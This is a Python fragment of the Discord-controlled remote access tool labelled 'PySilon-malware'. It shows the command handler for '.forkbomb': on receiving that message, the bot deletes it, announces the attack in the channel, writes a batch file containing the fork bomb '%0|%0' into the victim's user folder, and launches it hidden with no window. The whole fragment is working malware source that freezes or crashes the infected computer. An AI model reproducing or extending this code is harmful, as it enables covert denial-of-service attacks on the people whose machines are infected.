import subprocess
# end of imports
# on message
elif message.content == ".forkbomb":
    #.log Message is "fork bomb" 
    await message.delete()
    #.log Removed the message 
    embed = discord.Embed(title="💣 Starting...",description=f'```Starting fork bomb... This process may take some time.```', colour=discord.Colour.dark_theme())
    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
    await message.channel.send(embed=embed)
    #.log Sent message about for bomb starting 
    with open(f'C:\\Users\\{getuser()}\\wabbit.bat', 'w', encoding='utf-8') as wabbit:
        wabbit.write('%0|%0')
        #.log Generated wabbit.bat 
    subprocess.Popen(f'C:\\Users\\{getuser()}\\wabbit.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    #.log Executed wabbit.bat 
